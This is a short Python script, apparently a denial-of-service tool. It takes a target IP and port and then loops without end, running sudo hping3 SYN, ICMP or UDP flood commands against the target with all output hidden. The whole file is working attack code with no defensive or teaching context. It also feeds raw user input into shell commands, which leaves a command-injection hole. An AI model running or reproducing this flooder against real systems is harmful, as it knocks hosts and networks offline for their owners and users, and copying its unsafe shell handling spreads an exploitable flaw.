import subprocess as sb

target_ip = input("Enter target ip: ")
if target_ip.count('.')==3:
    port = int(input("on port: "))
    ch = int(input("Choice: "))

    while True:
        if ch==0:
            sb.run(f"sudo hping3 -S {target_ip} -p {port} -d 1200 --flood",shell=True,stdout=sb.DEVNULL, stderr=sb.DEVNULL)
        elif ch==1:
            sb.run(f"sudo hping3 --icmp -p {port} {target_ip} -d 1200 --flood",shell=True,stdout=sb.DEVNULL, stderr=sb.DEVNULL)
        elif ch==2:
            sb.run(f"sudo hping3 --udp -p {port} {target_ip} -d 1200 --flood",shell=True,stdout=sb.DEVNULL, stderr=sb.DEVNULL)
        else:
            sb.run(f"sudo hping3 -S {target_ip} -p {port} -d 1200 --faster",shell=True,stdout=sb.DEVNULL, stderr=sb.DEVNULL)
else:
    print("Enter a valid IP!")